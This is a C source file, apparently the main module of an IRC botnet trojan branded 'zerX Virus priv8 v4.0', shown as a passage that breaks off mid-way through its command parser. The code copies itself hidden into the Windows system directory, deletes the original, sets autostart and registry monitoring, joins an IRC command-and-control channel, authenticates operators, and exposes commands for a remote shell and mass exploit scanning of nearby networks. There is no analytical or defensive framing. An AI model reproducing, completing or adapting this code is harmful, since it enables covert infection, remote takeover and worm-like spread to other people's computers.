/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"
#include "configs.h"
#include "globals.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;

	#ifndef NO_EHANDLER
	// install exception handler
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           // Build EXCEPTION_REGISTRATION record:
        push    handler         // Address of handler function
        push    FS:[0]          // Address of previous handler
        mov     FS:[0],ESP      // Install new EXECEPTION_REGISTRATION
    }
	#endif

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifndef NO_CRYPT // Don't decrypt password here
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
	#endif

	LoadDLLs(); // load all the dlls and functions here

	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
				
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	
	#ifndef NO_MELT
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited 
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

	sprintf(logbuf,"-\x03\x34\2main\x03\2- Bot started.");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();


    #ifndef NO_REGISTRY
	sprintf(logbuf,"-\x03\x34\2secure\x03\2- Registry monitor active.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"-\x03\x34\2secure\x03\2- Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif
	// set version while bot is running
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2) 
				break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0) 
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}


		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0) 
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2) 
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), "4CodeD 8By 1zerX-Virus");

	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line		
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				
				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}

	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); // get our hostname
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use   
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"8,1-VrX- User %s logged out.", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126) 
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "8,1-VrX- User: %s logged out.", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) 
			*in_channel = 1;
		addlogv("8,1-VrX- Joined channel: %s.", a[4]);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
	
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}


		if (a[s]++[0] != prefix) 
			return 1;

		// see if someone is logging in
		// "login"
		if (strcmp("H4CK3D", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); // Encrypt password to compare to stored password
			#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass auth failed (%s!%s).\r\n", user, user, h);
				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "8,1-VrX- *Failed pass auth by: (%s!%s).", u, h);
				addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof(authost) / sizeof(LPTSTR));i++) {
			#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) { 
					host_ok = TRUE;
					break;
				}
			#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed (%s!%s).\r\n", user, user, h);
 				irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, "8,1-VrX- *Failed host auth by: (%s!%s).", u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- Password accepted.", notice);
					addlogv("8,1-VrX- User: %s logged in.", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) 
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57) 
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) 
						ntmp2[0] = (char)atoi(ntmp); 
					else 
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) 
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL) 
					return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick, nicktype, ((parameters['p'])?(TRUE):(FALSE)), a[s+1]);
				irc_sendv(sock, "NICK %s\r\n", nick);

				addlogv("8,1-VrX- Random nick change: %s",nick);

				return repeat;
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "8,1-VrX- User %s logged out.", masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "8,1-VrX- No user logged in at slot: %d.", i);
					} else
						sprintf(sendbuf, "8,1-VrX- Invalid login slot number: %d.", i);				
				} else {
					for (i = 0; i < MAXLOGINS; i++) 
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "8,1-VrX- User %s logged out.", user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_PROCESS
			else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"-\x03\x34\2procs\2\x03-","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"8,1-SC@N-","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			/*else if (strcmp("scandel",a[s]) == 0 || strcmp("sdel",a[s]) == 0) {
				DelPayloadFile(sock,a[2],notice,silent);

				return 1;
			}*/
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("8,1-VrX- Reconnecting.");

				return 0;
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) {
				sprintf(sendbuf, "8,1-VrX- Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "-\x03\x34\2threads\2\x03- List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"-\x03\x34\2threads\2\x03- Failed to start list thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
	
				return repeat;
			}
			// "remove"
			else if (strcmp("KOSOMAKY4D", a[s]) == 0 || strcmp("KOSOMAKY4D", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- Removing Bot.", notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "-\x03\x34\2procs\2\x03- Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"-\x03\x34\2procs\2\x03- Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"-\x03\x34\2procs\2\x03- Failed to start listing thread, error: <%d>.", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
			#endif
			else if (strcmp("uptime", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "8,1-VrX- Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} 

				return repeat;
			}
			#ifndef NO_REMOTECMD
			else if (strcmp("opencmd",a[s]) == 0 || strcmp("ocmd", a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"-\x03\x34\2cmd\2\x03- Remote shell already running.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1) 
						sprintf(sendbuf,"-\x03\x34\2cmd\2\x03- Couldn't open remote shell.");
					else 
						sprintf(sendbuf,"-\x03\x34\2cmd\2\x03- Remote shell ready.");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp("cmdstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"-\x03\x34\2cmd\2\x03-","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_ADVSCAN
			else if (strcmp("VzX", a[s]) == 0 || strcmp("VzX", a[s]) == 0) {
				for(int i=0; scanall[i].isend != false; i++) { }
				for(int sne=0; scanall[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"-\x03\x34\2VZ\2\x03- Already %d scanning threads. Too many specified.", scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						//advscan.port = atoi(a[s+1]); // check for method or port number
						advscan.threads = 50;
						advscan.delay = 5;
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = 9999;
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, scanall[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "-\x03\x34\2MaSS ScAn\2\x03- Failed to start scan, port is invalid.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
						SOCKADDR_IN ssin;
						int ssin_len=sizeof(ssin);
						fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
						ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
						strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

						int extractip = ((parameters['a']) ? 3 : 2);
						for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);		
						advscan.random = TRUE;
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "-\x03\x34\2scanall\2\x03- %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
							((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"-\x03\x34\2scanall\2\x03- Failed to start scan thread, error: <%d>.", GetLastError());

						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

					}
				}
				return 1;
			}
			#endif

			// commands requiring at least 1 parameter
			if (a[s+1] == NULL) return 1;
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("8,1-VrX- Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
